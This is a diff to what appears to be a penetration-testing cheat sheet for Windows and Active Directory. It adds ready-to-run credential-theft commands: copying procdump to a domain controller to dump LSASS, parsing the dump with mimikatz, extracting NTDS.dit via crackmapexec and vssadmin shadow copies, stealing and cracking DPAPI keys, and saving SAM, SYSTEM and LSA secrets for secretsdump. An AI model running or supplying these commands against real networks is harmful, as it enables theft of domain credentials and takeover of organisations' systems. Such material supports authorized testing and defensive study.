@@ -417,13 +417,103 @@ sc.exe start dns
 
 ### LSASS Dumping
 
+```powershell
+procdump --accepteula -ma lsass lsass.dmp
+```
+
+```powershell
+smbclient.py MEGACORP.LOCAL/john@dc01.megacorp.local
+# use C$
+# cd Windows\Temp
+# put procdump.exe
+```
+
+```powershell
+psexec.py MEGACORP.LOCAL/john@dc01.megacorp.local "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
+```
+```powershell
+smbclient.py MEGACORP.LOCAL/john@dc01.megacorp.local
+# get lsass.dmp
+```
+
+> parse creds with mimikatz
+```powershell
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+you can do it locally with mimikatz using : `sekurlsa::logonpasswords`.
+
+
 ### NTDS Dumping
 
-### DPAPI Dumping
+**Abusing DRSUAPI for NTDS dumping**
+
+```powershell
+crackmapexec smb 10.10.13.100 -u 'Administrator' -p $password --ntds drsuapi
+```
+
+**Abusing VSS for NTDS dumping**
+
+> using [Crackmapexec]() :
+```powershell
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds vss
+```
+> you can do it manually too.
+```powershell
+vssadmin create shadow /for=C:
+copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
+vssadmin delete shadows /shadow=$ShadowCopyId
+```
+
+
+### DPAPI Abusing
+
+> dump DPAPI BK
+```bash
+dpapi.py backupkeys -t $domain/$user:$password@$target
+```
+> Decrypt DPAPI MK 
+```bash
+# Decrypt DPAPI MK using BK
+dpapi.py masterkey -file "/path/to/masterkey" -pvk "/path/to/backup_key.pvk"
+# Decrypt DPAPI MK using MK password and user SID
+dpapi.py masterkey -file "/path/to/masterkey" -sid $USER_SID -password $mk_password
+```
+> decrypting protected file using MK
+```bash
+dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
+```
+
+*crack DPAPI master key with JTR*
+```bash
+python DPAPImk2john.py --sid="$SID" --masterkey="$MASTER_KEY" --context="local"
+john dpapimk.dmp --wordlist=/usr/share/wordlists/rockyou.txt --rules=custom.rule
+```
 
 ### LSA Dumping
 
+**you can use mimikatz with this command : `lsadump::secrets`**
+
 ### SAM Dumping
+
+*save SYSTEM hive and SAM in another directory*
+```powershell
+reg save HKLM\SAM c:\path\to\SAM
+reg save HKLM\SYSTEM c:\path\to\SYSTEM
+```
+
+```powershell
+lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
+```
+**[ 📝 ] Notes** : *you can dump SAM and LSA with crackmapexec **or** secretdump using these commands :*
+```bash
+secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+```
+```bash
+crackmapexec smb $ip -d $domain -u $user -p $password --sam/--lsa
+```
+
 
 ### Dump Registry Remotely and Directly
 
@@ -431,7 +521,7 @@ sc.exe start dns
 
 **HKEY_LOCAL_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.
 
-> dump SYSTEM and SECURITY directly from HKLM :
+> dump SYSTEM and SECURITY remotely from HKLM :
 
 ```bash
 secretsdump.py local -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile hashes
